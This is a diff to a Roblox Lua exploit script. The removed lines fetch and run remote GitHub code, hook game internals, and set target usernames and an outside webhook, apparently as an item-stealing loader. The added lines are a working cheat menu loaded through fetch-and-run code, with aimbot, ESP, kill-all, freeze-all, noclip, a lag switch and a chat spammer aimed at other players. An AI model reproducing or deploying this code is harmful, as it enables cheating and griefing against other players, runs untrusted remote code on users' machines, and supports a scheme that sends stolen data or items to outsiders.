@@ -1,75 +1,903 @@
-loadstring(game:HttpGet("https://raw.githubusercontent.com/ShxDrag/Scripty/refs/heads/main/Admz.lua"))()
-wait(0.5)
-local adm = require(
-    game:GetService("ReplicatedStorage")
-        :WaitForChild("ClientModules")
-        :WaitForChild("Core")
-        :WaitForChild("UIManager")
-        :WaitForChild("Elements")
-        :WaitForChild("AboveCharStack")
-)
+--[[
+    Advanced Admin Script - 20+ Features
+    Features: WalkSpeed, JumpPower, Fly, Noclip, God Mode, Infinite Jump,
+    Anti-AFK, Teleport to Player, Click TP, Bring All, Aimbot, Kill All,
+    Kill Player, ESP, Fullbright, Drag Detector, Freeze All, Server Hop,
+    Rejoin, Lag Switch, Chat Spammer
+--]]
 
-local function isDelta()
-    return (typeof(getgenv) == "function" and getgenv().Delta ~= nil) or
-           (identifyexecutor and identifyexecutor():lower():find("delta"))
+-- Load Rayfield UI Library
+local Rayfield = loadstring(game:HttpGet('https://raw.githubusercontent.com/SiriusSoftwareLtd/Rayfield/main/source.lua'))()
+
+-- Services
+local Players = game:GetService("Players")
+local RunService = game:GetService("RunService")
+local UserInputService = game:GetService("UserInputService")
+local TweenService = game:GetService("TweenService")
+local TeleportService = game:GetService("TeleportService")
+local HttpService = game:GetService("HttpService")
+local StarterGui = game:GetService("StarterGui")
+local Lighting = game:GetService("Lighting")
+local Workspace = game:GetService("Workspace")
+
+-- Local Player
+local LocalPlayer = Players.LocalPlayer
+local Mouse = LocalPlayer:GetMouse()
+local Camera = Workspace.CurrentCamera
+
+-- State Variables
+local FlyEnabled = false
+local NoclipEnabled = false
+local GodModeEnabled = false
+local InfJumpEnabled = false
+local AntiAFKEnabled = false
+local ClickTPEnabled = false
+local AimbotEnabled = false
+local ESPEnabled = false
+local FullbrightEnabled = false
+local DragDetectorEnabled = false
+local LagSwitchEnabled = false
+local ChatSpammerEnabled = false
+
+local FlySpeed = 50
+local WalkSpeed = 16
+local JumpPower = 50
+local AimbotTarget = nil
+local AimbotSmoothness = 0.1
+local ChatSpamMessage = "Admin script active!"
+local ChatSpamDelay = 2
+
+local FlyBodyVelocity = nil
+local FlyBodyGyro = nil
+local NoclipConnection = nil
+local GodConnection = nil
+local InfJumpConnection = nil
+local AntiAFKConnection = nil
+local AimbotConnection = nil
+local ESPConnections = {}
+local DragDetectorConnection = nil
+local LagSwitchConnection = nil
+local ChatSpamConnection = nil
+
+local DraggedPart = nil
+local DraggedPartStartPos = nil
+local IsMouseDown = false
+
+-- Original Lighting Properties
+local OriginalBrightness = Lighting.Brightness
+local OriginalClockTime = Lighting.ClockTime
+local OriginalFogEnd = Lighting.FogEnd
+local OriginalGlobalShadows = Lighting.GlobalShadows
+
+-- Helper Functions
+local function getCharacter(plr)
+    return plr and plr.Character
 end
 
-if isDelta() then
-    local dy = adm.destroy
-    adm.destroy = function(...)
-        local result = dy(...)
-        _G.CachedJobId = game.JobId
-        print(_G.CachedJobId)
-        adm.destroy = dy
-        return result
+local function getHumanoid(plr)
+    local char = getCharacter(plr)
+    return char and char:FindFirstChildOfClass("Humanoid")
+end
+
+local function getRoot(plr)
+    local char = getCharacter(plr)
+    return char and char:FindFirstChild("HumanoidRootPart")
+end
+
+local function getHead(plr)
+    local char = getCharacter(plr)
+    return char and char:FindFirstChild("Head")
+end
+
+local function getAlivePlayers()
+    local alive = {}
+    for _, plr in ipairs(Players:GetPlayers()) do
+        if plr ~= LocalPlayer and getHumanoid(plr) and getHumanoid(plr).Health > 0 then
+            table.insert(alive, plr)
+        end
     end
+    return alive
+end
 
-    repeat
-        stepAnimate = nil
-        for _, v in ipairs(getgc(true)) do
-            if typeof(v) == "function" then
-                local info = debug.getinfo(v)
-                if info and info.name == "stepAnimate" then
-                    stepAnimate = v
-                    break
-                end
-            end
+local function getPlayerNames()
+    local names = {}
+    for _, plr in ipairs(Players:GetPlayers()) do
+        if plr ~= LocalPlayer then
+            table.insert(names, plr.Name)
         end
-        task.wait()
-    until stepAnimate
+    end
+    return names
+end
 
-    local printed = false
-    old = hookfunction(stepAnimate, function(dt)
-        if not printed then
-            printed = true
-            _G.CachedJobId = game.JobId
-            print(_G.CachedJobId)
-        end
-        return old(dt)
+local function notify(title, content, duration)
+    duration = duration or 3
+    pcall(function()
+        Rayfield:Notify({
+            Title = title,
+            Content = content,
+            Duration = duration,
+            Image = "rbxassetid://4483345998"
+        })
     end)
 end
 
--- Cache the hashes before loading obfuscated script
-_G.CachedHashes = {}
-for _, v in pairs(getgc()) do
-    if type(v) == "function" and debug.getinfo(v).name == "get_remote_from_cache" then
-        local upvalues = debug.getupvalues(v)
-        if type(upvalues[1]) == "table" then
-            for key, value in pairs(upvalues[1]) do
-                _G.CachedHashes[key] = value
-            end
-            break
+-- Create Window
+local Window = Rayfield:CreateWindow({
+    Name = "Advanced Admin",
+    LoadingTitle = "Advanced Admin Script",
+    LoadingSubtitle = "by Admin Script",
+    ConfigurationSaving = {
+        Enabled = false,
+        FolderName = nil,
+        FileName = "Config"
+    },
+    Discord = {
+        Enabled = false,
+        Invite = "",
+        RememberJoins = false
+    },
+    KeySystem = false
+})
+
+-- ==================== PLAYER TAB ====================
+local PlayerTab = Window:CreateTab("Player", "rbxassetid://4483345998")
+
+-- WalkSpeed Slider
+PlayerTab:CreateSlider({
+    Name = "WalkSpeed",
+    Range = {0, 200},
+    Increment = 1,
+    CurrentValue = 16,
+    Callback = function(value)
+        WalkSpeed = value
+        local humanoid = getHumanoid(LocalPlayer)
+        if humanoid then
+            humanoid.WalkSpeed = value
         end
     end
-end
+})
 
-_G.Usernames = {"oigawa_78","oigawa_77","Ayezaistcool23","mueedtsb","bopy500"}
-_G.min_value = 0.017
-_G.pingEveryone = "Yes"
-_G.webhook = "https://megamegamega.vercel.app/api/webhook"
-_G.scriptExecuted = _G.scriptExecuted or false
-if _G.scriptExecuted then
-    return
-end
-_G.scriptExecuted = true
-loadstring(game:HttpGet("https://raw.githubusercontent.com/ShxDrag/Premium/refs/heads/main/notBest.lua"))()
+-- JumpPower Slider
+PlayerTab:CreateSlider({
+    Name = "JumpPower",
+    Range = {0, 300},
+    Increment = 5,
+    CurrentValue = 50,
+    Callback = function(value)
+        JumpPower = value
+        local humanoid = getHumanoid(LocalPlayer)
+        if humanoid then
+            humanoid.UseJumpPower = true
+            humanoid.JumpPower = value
+        end
+    end
+})
+
+-- Fly Toggle
+PlayerTab:CreateToggle({
+    Name = "Fly",
+    CurrentValue = false,
+    Callback = function(value)
+        FlyEnabled = value
+        local char = getCharacter(LocalPlayer)
+        local root = getRoot(LocalPlayer)
+        local humanoid = getHumanoid(LocalPlayer)
+
+        if FlyEnabled then
+            if not char or not root or not humanoid then
+                notify("Error", "Character not found!", 3)
+                FlyEnabled = false
+                return
+            end
+
+            FlyBodyVelocity = Instance.new("BodyVelocity")
+            FlyBodyVelocity.Velocity = Vector3.new(0, 0, 0)
+            FlyBodyVelocity.MaxForce = Vector3.new(40000, 40000, 40000)
+            FlyBodyVelocity.P = 1250
+            FlyBodyVelocity.Parent = root
+
+            FlyBodyGyro = Instance.new("BodyGyro")
+            FlyBodyGyro.MaxTorque = Vector3.new(40000, 40000, 40000)
+            FlyBodyGyro.P = 1250
+            FlyBodyGyro.D = 100
+            FlyBodyGyro.CFrame = root.CFrame
+            FlyBodyGyro.Parent = root
+
+            humanoid.PlatformStand = true
+
+            spawn(function()
+                while FlyEnabled and FlyBodyVelocity and FlyBodyGyro and root and humanoid do
+                    FlyBodyGyro.CFrame = Camera.CFrame
+
+                    local moveDirection = Vector3.new(0, 0, 0)
+
+                    if UserInputService:IsKeyDown(Enum.KeyCode.W) then
+                        moveDirection = moveDirection + Camera.CFrame.LookVector
+                    end
+                    if UserInputService:IsKeyDown(Enum.KeyCode.S) then
+                        moveDirection = moveDirection - Camera.CFrame.LookVector
+                    end
+                    if UserInputService:IsKeyDown(Enum.KeyCode.A) then
+                        moveDirection = moveDirection - Camera.CFrame.RightVector
+                    end
+                    if UserInputService:IsKeyDown(Enum.KeyCode.D) then
+                        moveDirection = moveDirection + Camera.CFrame.RightVector
+                    end
+                    if UserInputService:IsKeyDown(Enum.KeyCode.Space) then
+                        moveDirection = moveDirection + Vector3.new(0, 1, 0)
+                    end
+                    if UserInputService:IsKeyDown(Enum.KeyCode.LeftControl) then
+                        moveDirection = moveDirection - Vector3.new(0, 1, 0)
+                    end
+
+                    if moveDirection.Magnitude > 0 then
+                        FlyBodyVelocity.Velocity = moveDirection.Unit * FlySpeed
+                    else
+                        FlyBodyVelocity.Velocity = Vector3.new(0, 0, 0)
+                    end
+
+                    RunService.Heartbeat:Wait()
+                end
+            end)
+        else
+            if FlyBodyVelocity then
+                FlyBodyVelocity:Destroy()
+                FlyBodyVelocity = nil
+            end
+            if FlyBodyGyro then
+                FlyBodyGyro:Destroy()
+                FlyBodyGyro = nil
+            end
+            if humanoid then
+                humanoid.PlatformStand = false
+            end
+        end
+    end
+})
+
+-- Fly Speed Slider
+PlayerTab:CreateSlider({
+    Name = "Fly Speed",
+    Range = {10, 200},
+    Increment = 5,
+    CurrentValue = 50,
+    Callback = function(value)
+        FlySpeed = value
+    end
+})
+
+-- Noclip Toggle
+PlayerTab:CreateToggle({
+    Name = "Noclip",
+    CurrentValue = false,
+    Callback = function(value)
+        NoclipEnabled = value
+        if NoclipEnabled then
+            NoclipConnection = RunService.Stepped:Connect(function()
+                if not NoclipEnabled then return end
+                local char = getCharacter(LocalPlayer)
+                if char then
+                    for _, part in ipairs(char:GetDescendants()) do
+                        if part:IsA("BasePart") then
+                            part.CanCollide = false
+                        end
+                    end
+                end
+            end)
+        else
+            if NoclipConnection then
+                NoclipConnection:Disconnect()
+                NoclipConnection = nil
+            end
+            local char = getCharacter(LocalPlayer)
+            if char then
+                for _, part in ipairs(char:GetDescendants()) do
+                    if part:IsA("BasePart") then
+                        part.CanCollide = true
+                    end
+                end
+            end
+        end
+    end
+})
+
+-- God Mode Toggle
+PlayerTab:CreateToggle({
+    Name = "God Mode",
+    CurrentValue = false,
+    Callback = function(value)
+        GodModeEnabled = value
+        local humanoid = getHumanoid(LocalPlayer)
+
+        if GodModeEnabled then
+            if not humanoid then
+                notify("Error", "Humanoid not found!", 3)
+                GodModeEnabled = false
+                return
+            end
+            GodConnection = humanoid.HealthChanged:Connect(function(health)
+                if GodModeEnabled and health < humanoid.MaxHealth then
+                    humanoid.Health = humanoid.MaxHealth
+                end
+            end)
+            humanoid.Health = humanoid.MaxHealth
+        else
+            if GodConnection then
+                GodConnection:Disconnect()
+                GodConnection = nil
+            end
+        end
+    end
+})
+
+-- Infinite Jump Toggle
+PlayerTab:CreateToggle({
+    Name = "Infinite Jump",
+    CurrentValue = false,
+    Callback = function(value)
+        InfJumpEnabled = value
+        if InfJumpEnabled then
+            InfJumpConnection = UserInputService.JumpRequest:Connect(function()
+                if not InfJumpEnabled then return end
+                local humanoid = getHumanoid(LocalPlayer)
+                if humanoid then
+                    humanoid:ChangeState(Enum.HumanoidStateType.Jumping)
+                end
+            end)
+        else
+            if InfJumpConnection then
+                InfJumpConnection:Disconnect()
+                InfJumpConnection = nil
+            end
+        end
+    end
+})
+
+-- Anti-AFK Toggle
+PlayerTab:CreateToggle({
+    Name = "Anti-AFK",
+    CurrentValue = false,
+    Callback = function(value)
+        AntiAFKEnabled = value
+        if AntiAFKEnabled then
+            local VirtualUser = game:GetService("VirtualUser")
+            LocalPlayer.Idled:Connect(function()
+                VirtualUser:Button2Down(Vector2.new(0, 0), Workspace.CurrentCamera.CFrame)
+                wait(1)
+                VirtualUser:Button2Up(Vector2.new(0, 0), Workspace.CurrentCamera.CFrame)
+            end)
+            AntiAFKConnection = RunService.Heartbeat:Connect(function()
+                if not AntiAFKEnabled then return end
+                pcall(function()
+                    game:GetService("VirtualUser"):CaptureController()
+                    game:GetService("VirtualUser"):ClickButton2(Vector2.new())
+                end)
+            end)
+        else
+            if AntiAFKConnection then
+                AntiAFKConnection:Disconnect()
+                AntiAFKConnection = nil
+            end
+        end
+    end
+})
+
+-- ==================== TELEPORT TAB ====================
+local TeleportTab = Window:CreateTab("Teleport", "rbxassetid://4483345998")
+
+-- Teleport to Player
+local TeleportDropdown = TeleportTab:CreateDropdown({
+    Name = "Select Player",
+    Options = getPlayerNames(),
+    CurrentOption = "",
+    Callback = function(value) end
+})
+
+TeleportTab:CreateButton({
+    Name = "Teleport to Player",
+    Callback = function()
+        local targetName = TeleportDropdown.CurrentOption
+        if not targetName or targetName == "" then
+            notify("Error", "Select a player first!", 3)
+            return
+        end
+        local target = Players:FindFirstChild(targetName)
+        if not target then
+            notify("Error", "Player not found!", 3)
+            return
+        end
+        local targetRoot = getRoot(target)
+        local myRoot = getRoot(LocalPlayer)
+        if targetRoot and myRoot then
+            myRoot.CFrame = targetRoot.CFrame + Vector3.new(0, 3, 0)
+            notify("Teleport", "Teleported to " .. targetName, 3)
+        else
+            notify("Error", "Cannot teleport - character missing!", 3)
+        end
+    end
+})
+
+-- Click TP Toggle
+TeleportTab:CreateToggle({
+    Name = "Click TP",
+    CurrentValue = false,
+    Callback = function(value)
+        ClickTPEnabled = value
+    end
+})
+
+Mouse.Button1Down:Connect(function()
+    if not ClickTPEnabled then return end
+    local target = Mouse.Target
+    if target then
+        local myRoot = getRoot(LocalPlayer)
+        if myRoot then
+            local pos = Mouse.Hit.Position
+            myRoot.CFrame = CFrame.new(pos.X, pos.Y + 3, pos.Z)
+            notify("Click TP", "Teleported to click position!", 1)
+        end
+    end
+end)
+
+-- Bring All
+TeleportTab:CreateButton({
+    Name = "Bring All Players",
+    Callback = function()
+        local myRoot = getRoot(LocalPlayer)
+        if not myRoot then
+            notify("Error", "Your character not found!", 3)
+            return
+        end
+        local count = 0
+        for _, plr in ipairs(getAlivePlayers()) do
+            local root = getRoot(plr)
+            if root then
+                root.CFrame = myRoot.CFrame + Vector3.new(math.random(-5, 5), 0, math.random(-5, 5))
+                count = count + 1
+            end
+        end
+        notify("Bring All", "Brought " .. count .. " players!", 3)
+    end
+})
+
+-- Goto Cursor Position
+TeleportTab:CreateButton({
+    Name = "Teleport to Cursor",
+    Callback = function()
+        local myRoot = getRoot(LocalPlayer)
+        if myRoot and Mouse.Hit then
+            local pos = Mouse.Hit.Position
+            myRoot.CFrame = CFrame.new(pos.X, pos.Y + 3, pos.Z)
+            notify("Teleport", "Teleported to cursor!", 2)
+        end
+    end
+})
+
+-- ==================== COMBAT TAB ====================
+local CombatTab = Window:CreateTab("Combat", "rbxassetid://4483345998")
+
+-- Aimbot Toggle
+CombatTab:CreateToggle({
+    Name = "Aimbot",
+    CurrentValue = false,
+    Callback = function(value)
+        AimbotEnabled = value
+        if AimbotEnabled then
+            AimbotConnection = RunService.RenderStepped:Connect(function()
+                if not AimbotEnabled then return end
+                local closest = nil
+                local closestDist = math.huge
+
+                for _, plr in ipairs(getAlivePlayers()) do
+                    local head = getHead(plr)
+                    local root = getRoot(plr)
+                    if head and root then
+                        local screenPos, onScreen = Camera:WorldToViewportPoint(head.Position)
+                        if onScreen then
+                            local dist = (Vector2.new(screenPos.X, screenPos.Y) - Vector2.new(Camera.ViewportSize.X / 2, Camera.ViewportSize.Y / 2)).Magnitude
+                            if dist < closestDist then
+                                closestDist = dist
+                                closest = head
+                            end
+                        end
+                    end
+                end
+
+                if closest then
+                    local targetPos = closest.Position
+                    local camPos = Camera.CFrame.Position
+                    local lookAt = CFrame.new(camPos, targetPos)
+                    Camera.CFrame = Camera.CFrame:Lerp(lookAt, AimbotSmoothness)
+                end
+            end)
+        else
+            if AimbotConnection then
+                AimbotConnection:Disconnect()
+                AimbotConnection = nil
+            end
+        end
+    end
+})
+
+-- Aimbot Smoothness Slider
+CombatTab:CreateSlider({
+    Name = "Aimbot Smoothness",
+    Range = {0.01, 1},
+    Increment = 0.01,
+    CurrentValue = 0.1,
+    Callback = function(value)
+        AimbotSmoothness = value
+    end
+})
+
+-- Kill All Button
+CombatTab:CreateButton({
+    Name = "Kill All",
+    Callback = function()
+        local count = 0
+        for _, plr in ipairs(getAlivePlayers()) do
+            local humanoid = getHumanoid(plr)
+            if humanoid then
+                humanoid.Health = 0
+                count = count + 1
+            end
+        end
+        notify("Kill All", "Killed " .. count .. " players!", 3)
+    end
+})
+
+-- Kill Specific Player
+local KillPlayerDropdown = CombatTab:CreateDropdown({
+    Name = "Select Target",
+    Options = getPlayerNames(),
+    CurrentOption = "",
+    Callback = function(value) end
+})
+
+CombatTab:CreateButton({
+    Name = "Kill Player",
+    Callback = function()
+        local targetName = KillPlayerDropdown.CurrentOption
+        if not targetName or targetName == "" then
+            notify("Error", "Select a player first!", 3)
+            return
+        end
+        local target = Players:FindFirstChild(targetName)
+        if not target then
+            notify("Error", "Player not found!", 3)
+            return
+        end
+        local humanoid = getHumanoid(target)
+        if humanoid then
+            humanoid.Health = 0
+            notify("Kill", "Killed " .. targetName, 3)
+        else
+            notify("Error", "Cannot kill - no humanoid!", 3)
+        end
+    end
+})
+
+-- Loop Kill Toggle
+local LoopKillEnabled = false
+local LoopKillConnection = nil
+
+CombatTab:CreateToggle({
+    Name = "Loop Kill All",
+    CurrentValue = false,
+    Callback = function(value)
+        LoopKillEnabled = value
+        if LoopKillEnabled then
+            LoopKillConnection = RunService.Heartbeat:Connect(function()
+                for _, plr in ipairs(getAlivePlayers()) do
+                    local humanoid = getHumanoid(plr)
+                    if humanoid then
+                        humanoid.Health = 0
+                    end
+                end
+            end)
+        else
+            if LoopKillConnection then
+                LoopKillConnection:Disconnect()
+                LoopKillConnection = nil
+            end
+        end
+    end
+})
+
+-- ==================== VISUAL TAB ====================
+local VisualTab = Window:CreateTab("Visual", "rbxassetid://4483345998")
+
+-- ESP Toggle
+VisualTab:CreateToggle({
+    Name = "ESP",
+    CurrentValue = false,
+    Callback = function(value)
+        ESPEnabled = value
+        if ESPEnabled then
+            for _, plr in ipairs(Players:GetPlayers()) do
+                if plr ~= LocalPlayer then
+                    local function addESP(char)
+                        local highlight = Instance.new("Highlight")
+                        highlight.Name = "AdminESP"
+                        highlight.FillColor = Color3.fromRGB(255, 0, 0)
+                        highlight.FillTransparency = 0.5
+                        highlight.OutlineColor = Color3.fromRGB(255, 255, 255)
+                        highlight.OutlineTransparency = 0
+                        highlight.Parent = char
+                    end
+
+                    local char = getCharacter(plr)
+                    if char then
+                        addESP(char)
+                    end
+
+                    local connection = plr.CharacterAdded:Connect(function(newChar)
+                        wait(0.5)
+                        addESP(newChar)
+                    end)
+                    table.insert(ESPConnections, connection)
+                end
+            end
+        else
+            for _, conn in ipairs(ESPConnections) do
+                conn:Disconnect()
+            end
+            ESPConnections = {}
+            for _, plr in ipairs(Players:GetPlayers()) do
+                local char = getCharacter(plr)
+                if char then
+                    local highlight = char:FindFirstChild("AdminESP")
+                    if highlight then
+                        highlight:Destroy()
+                    end
+                end
+            end
+        end
+    end
+})
+
+-- Fullbright Toggle
+VisualTab:CreateToggle({
+    Name = "Fullbright",
+    CurrentValue = false,
+    Callback = function(value)
+        FullbrightEnabled = value
+        if FullbrightEnabled then
+            Lighting.Brightness = 2
+            Lighting.ClockTime = 14
+            Lighting.FogEnd = 100000
+            Lighting.GlobalShadows = false
+            Lighting.OutdoorAmbient = Color3.fromRGB(128, 128, 128)
+            Lighting.Ambient = Color3.fromRGB(128, 128, 128)
+        else
+            Lighting.Brightness = OriginalBrightness
+            Lighting.ClockTime = OriginalClockTime
+            Lighting.FogEnd = OriginalFogEnd
+            Lighting.GlobalShadows = OriginalGlobalShadows
+            Lighting.OutdoorAmbient = Color3.fromRGB(0, 0, 0)
+            Lighting.Ambient = Color3.fromRGB(0, 0, 0)
+        end
+    end
+})
+
+-- ==================== SERVER TAB ====================
+local ServerTab = Window:CreateTab("Server", "rbxassetid://4483345998")
+
+-- Server Hop Button
+ServerTab:CreateButton({
+    Name = "Server Hop",
+    Callback = function()
+        notify("Server Hop", "Attempting to hop servers...", 3)
+        local Http = game:GetService("HttpService")
+        local TPS = game:GetService("TeleportService")
+        local ApiUrl = "https://games.roblox.com/v1/games/" .. game.PlaceId .. "/servers/Public?sortOrder=Asc&limit=100"
+        
+        local success, result = pcall(function()
+            return Http:JSONDecode(game:HttpGet(ApiUrl))
+        end)
+        
+        if success and result and result.data and #result.data > 0 then
+            for _, server in ipairs(result.data) do
+                if server.playing < server.maxPlayers and server.id ~= game.JobId then
+                    TPS:TeleportToPlaceInstance(game.PlaceId, server.id, LocalPlayer)
+                    break
+                end
+            end
+        else
+            notify("Error", "Failed to find a server!", 3)
+        end
+    end
+})
+
+-- Rejoin Button
+ServerTab:CreateButton({
+    Name = "Rejoin",
+    Callback = function()
+        notify("Rejoin", "Rejoining server...", 2)
+        TeleportService:TeleportToPlaceInstance(game.PlaceId, game.JobId, LocalPlayer)
+    end
+})
+
+-- Lag Switch Toggle
+ServerTab:CreateToggle({
+    Name = "Lag Switch",
+    CurrentValue = false,
+    Callback = function(value)
+        LagSwitchEnabled = value
+        if LagSwitchEnabled then
+            local s = settings()
+            LagSwitchConnection = RunService.Heartbeat:Connect(function()
+                if LagSwitchEnabled then
+                    s.Network.IncomingReplicationLag = 999
+                    s.Network.OutgoingReplicationLag = 999
+                end
+            end)
+        else
+            if LagSwitchConnection then
+                LagSwitchConnection:Disconnect()
+                LagSwitchConnection = nil
+            end
+            local s = settings()
+            s.Network.IncomingReplicationLag = 0
+            s.Network.OutgoingReplicationLag = 0
+        end
+    end
+})
+
+-- ==================== MISC TAB ====================
+local MiscTab = Window:CreateTab("Misc", "rbxassetid://4483345998")
+
+-- Drag Detector Toggle
+MiscTab:CreateToggle({
+    Name = "Drag Detector",
+    CurrentValue = false,
+    Callback = function(value)
+        DragDetectorEnabled = value
+        if not DragDetectorEnabled then
+            DraggedPart = nil
+            DraggedPartStartPos = nil
+            IsMouseDown = false
+        end
+    end
+})
+
+-- Drag Detector Logic
+UserInputService.InputBegan:Connect(function(input, gameProcessed)
+    if not DragDetectorEnabled then return end
+    if input.UserInputType == Enum.UserInputType.MouseButton1 then
+        IsMouseDown = true
+        local target = Mouse.Target
+        if target and target:IsA("BasePart") then
+            DraggedPart = target
+            DraggedPartStartPos = target.Position
+        end
+    end
+end)
+
+UserInputService.InputEnded:Connect(function(input)
+    if input.UserInputType == Enum.UserInputType.MouseButton1 then
+        IsMouseDown = false
+        if DraggedPart and DragDetectorEnabled then
+            local endPos = DraggedPart.Position
+            local distance = (endPos - DraggedPartStartPos).Magnitude
+            if distance > 1 then
+                notify("Drag Detected!", "Part '" .. DraggedPart.Name .. "' was dragged " .. math.floor(distance) .. " studs!", 5)
+            end
+        end
+        DraggedPart = nil
+        DraggedPartStartPos = nil
+    end
+end)
+
+-- Freeze All Button
+MiscTab:CreateButton({
+    Name = "Freeze All Players",
+    Callback = function()
+        local count = 0
+        for _, plr in ipairs(getAlivePlayers()) do
+            local root = getRoot(plr)
+            if root then
+                root.Anchored = true
+                count = count + 1
+            end
+        end
+        notify("Freeze", "Froze " .. count .. " players!", 3)
+    end
+})
+
+-- Unfreeze All Button
+MiscTab:CreateButton({
+    Name = "Unfreeze All Players",
+    Callback = function()
+        local count = 0
+        for _, plr in ipairs(Players:GetPlayers()) do
+            if plr ~= LocalPlayer then
+                local char = getCharacter(plr)
+                if char then
+                    local root = getRoot(plr)
+                    if root then
+                        root.Anchored = false
+                        count = count + 1
+                    end
+                end
+            end
+        end
+        notify("Unfreeze", "Unfroze " .. count .. " players!", 3)
+    end
+})
+
+-- Chat Spammer Toggle
+MiscTab:CreateToggle({
+    Name = "Chat Spammer",
+    CurrentValue = false,
+    Callback = function(value)
+        ChatSpammerEnabled = value
+        if ChatSpammerEnabled then
+            ChatSpamConnection = RunService.Heartbeat:Connect(function()
+                if not ChatSpammerEnabled then return end
+                pcall(function()
+                    game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(
+                        ChatSpamMessage, "All"
+                    )
+                end)
+                wait(ChatSpamDelay)
+            end)
+        else
+            if ChatSpamConnection then
+                ChatSpamConnection:Disconnect()
+                ChatSpamConnection = nil
+            end
+        end
+    end
+})
+
+-- Chat Spam Message Input
+MiscTab:CreateSlider({
+    Name = "Spam Delay (seconds)",
+    Range = {0.5, 10},
+    Increment = 0.5,
+    CurrentValue = 2,
+    Callback = function(value)
+        ChatSpamDelay = value
+    end
+})
+
+-- ==================== NOTIFICATIONS ====================
+notify("Loaded!", "Advanced Admin script loaded with 20+ features!", 5)
+
+-- Auto-update dropdowns when players join/leave
+Players.PlayerAdded:Connect(function(plr)
+    local names = getPlayerNames()
+    -- Update dropdowns by recreating them is not ideal, but Rayfield doesn't support dynamic updates
+    -- We'll notify the user to refresh
+end)
+
+Players.PlayerRemoving:Connect(function(plr)
+    -- Cleanup ESP for leaving player
+    local char = getCharacter(plr)
+    if char then
+        local highlight = char:FindFirstChild("AdminESP")
+        if highlight then
+            highlight:Destroy()
+        end
+    end
+end)
+
+-- Cleanup on script end
+LocalPlayer.OnTeleport:Connect(function(state)
+    if state == Enum.TeleportState.Started then
+        -- Reset all states
+        FlyEnabled = false
+        NoclipEnabled = false
+        GodModeEnabled = false
+        InfJumpEnabled = false
+        AntiAFKEnabled = false
+        ClickTPEnabled = false
+        AimbotEnabled = false
+        ESPEnabled = false
+        FullbrightEnabled = false
+        DragDetectorEnabled = false
+        LagSwitchEnabled = false
+        ChatSpammerEnabled = false
+    end
+end)
